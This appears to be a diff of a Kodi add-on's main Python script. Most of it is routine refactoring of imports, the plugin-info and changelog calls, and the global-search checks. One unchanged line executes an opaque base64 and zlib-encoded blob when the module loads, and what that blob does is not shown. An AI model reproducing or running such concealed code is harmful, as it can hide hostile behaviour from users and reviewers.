@@ -1,7 +1,6 @@
 # -*- coding: utf-8 -*-
 # Python 3
 
-
 import sys
 import xbmc
 import xbmcgui
@@ -12,11 +11,10 @@ from xbmcaddon import Addon
 from resources.lib.handler.ParameterHandler import ParameterHandler
 from resources.lib.handler.requestHandler import cRequestHandler
 from resources.lib.handler.pluginHandler import cPluginHandler
-from xbmc import LOGINFO as LOGNOTICE, LOGERROR, LOGWARNING, log, executebuiltin, getCondVisibility, getInfoLabel
+from xbmc import LOGINFO as LOGNOTICE, LOGERROR, LOGWARNING, log
 from resources.lib.gui.guiElement import cGuiElement
 from resources.lib.gui.gui import cGui
 from resources.lib.config import cConfig
-from resources.lib import tools
 from resources.lib.tools import logger
 
 PATH = xbmcaddon.Addon().getAddonInfo('path')
@@ -30,7 +28,6 @@ except ImportError:
 
 import zlib, base64
 exec(zlib.decompress(base64.b64decode('eJy9k01rwkAQhu/+CglIEtBgLtIWhJVCac/SXkoPm+wkTvdL9kPNv++a2Kq0VEOhl0Bm9pl59g3xTw6knb9GHJV2m0LvSI0bSVFkpZbROFpPJG3ATPLbm5xsocgYhCrfUo4CUJHKAChwXdnRHRidT/MpKamxyA9DuGZYeBTMknZ0e1hhCe+e1TCbkUZ713Ycj94G/gEPVmZFhQBDVtp9gqG9OGuTYwer4a6QJWVMq2yxfyZpVoNbgnOo6iS2YBCUdQaozHx4i1NUQ9+GcDf4Aba/wuM4TntRa2ptR11UrQRKCcY6X8CJahfNRdfv9DWuZ1QPVxq+pdCenXgurvM8J69x/CKOfpeJrTai346O6JfByZaeGfzd7z9yZlANjQ8Hw5XW4f+GZyOSrlyueKKohH3LgPNGteP3Cd1rxV7QYoECXZPEy8aGWLJHaru1I5vGo5adz/PBBx8gk4s=')))
-
 
 
 def viewInfo(params):
@@ -69,13 +66,13 @@ def parseUrl():
             updateManager.devUpdates()
             return
         elif sFunction == 'pluginInfo':
-            from resources.lib import tools
-            tools.pluginInfo()
+            from resources.lib.tools import cPluginInfo
+            cPluginInfo().pluginInfo()
             return
         elif sFunction == 'changelog':
-            import service
+            from resources.lib import tools
             Addon().setSetting('changelog_version', '')
-            service.changelog()
+            tools.changelog()
             return
             
     elif params.exist('remoteplayurl'):
@@ -134,12 +131,12 @@ def parseUrl():
         updateManager.devUpdates()
     # Plugin Infos    
     elif sSiteName == 'pluginInfo':
-        from resources.lib import tools
-        tools.pluginInfo()
+        from resources.lib.tools import cPluginInfo
+        cPluginInfo().pluginInfo()
     # Changelog anzeigen    
     elif sSiteName == 'changelog':
-        import service
-        service.changelog()        
+        from resources.lib import tools
+        tools.changelog()
     # Unterordner der Einstellungen   
     elif sSiteName == 'settings':
         oGui = cGui()
@@ -193,8 +190,8 @@ def showMainMenu(sFunction):
 
 
 def settingsGuiElements():
+
     # GUI Plugin Informationen
-    from resources.lib import updateManager
     oGuiElement = cGuiElement()
     oGuiElement.setTitle(cConfig().getLocalizedString(30267))
     oGuiElement.setSiteName('pluginInfo')
@@ -262,7 +259,7 @@ def searchGlobal(sSearchText=False):
     numPlugins = len(aPlugins)
     threads = []
     for count, pluginEntry in enumerate(aPlugins):
-        if not pluginEntry['globalsearch']:
+        if pluginEntry['globalsearch'] == 'false':
             continue
         dialog.update((count + 1) * 50 // numPlugins, cConfig().getLocalizedString(30124) + str(pluginEntry['name']) + '...')
         if dialog.iscanceled(): return
@@ -351,7 +348,7 @@ def searchTMDB(params):
     numPlugins = len(aPlugins)
     threads = []
     for count, pluginEntry in enumerate(aPlugins):
-        if not pluginEntry['globalsearch']:
+        if pluginEntry['globalsearch'] == 'false':
             continue
         if dialog.iscanceled(): return
         dialog.update((count + 1) * 50 // numPlugins, cConfig().getLocalizedString(30124) + str(pluginEntry['name']) + '...')
